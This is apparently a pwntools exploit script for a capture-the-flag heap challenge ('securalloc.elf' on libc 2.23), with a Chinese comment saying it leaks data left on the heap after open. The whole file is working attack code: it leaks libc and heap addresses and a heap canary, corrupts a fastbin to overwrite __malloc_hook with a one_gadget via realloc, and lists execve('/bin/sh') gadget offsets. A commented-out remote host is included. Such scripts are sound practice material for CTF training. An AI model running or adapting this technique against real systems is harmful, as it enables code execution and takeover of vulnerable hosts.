#利用open后的堆上残余数据leak
from pwn import *
context.log_level = 'debug'
prog = './securalloc.elf'
elf = ELF(prog)
p = process(prog)
libc = ELF("./libc-2.23.so")
#p = remote("76.74.177.238", 9001)
def dbg():
    gdb.attach(p)
    p.interactive()

def add(size):
	p.sendlineafter("> ", '1')
	p.sendlineafter("Size: ", str(size))
def show():
	p.sendlineafter("> ", '3')
def edit(data):
	p.sendlineafter("> ", '2')
	p.sendlineafter("Data: ", data)
def free():
	p.sendlineafter("> ", '4')
def exp():
	add(0x40)
	edit(p64(0)*4+p64(1))
	add(8)
	show()
	libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-libc.sym['_IO_2_1_stderr_']
	malloc_hook = libc_base + libc.sym['__malloc_hook']
	realloc = libc_base + libc.sym['realloc']
	success(hex(libc_base))
	add(0x10)
	show()
	p.recvuntil("Data: ")
	heap_addr = u64(p.recv(6)+'\x00'*2)
	add(0x190)
	add(8)
	show()
	p.recvuntil("Data: ")
	canary = u64('\x00'+p.recv(8)[-7:])
	success(hex(canary))
	free()
	add(0x50)
	free()
	add(8)
	edit('a'*8+p64(canary)+p64(0x71)+p64(malloc_hook-0x23))
	add(0x50)
	add(0x50)
	one = libc_base + 0x4526a
	edit('\x00'*3+p64(one)+p64(realloc+4))
	dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
'''
	0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
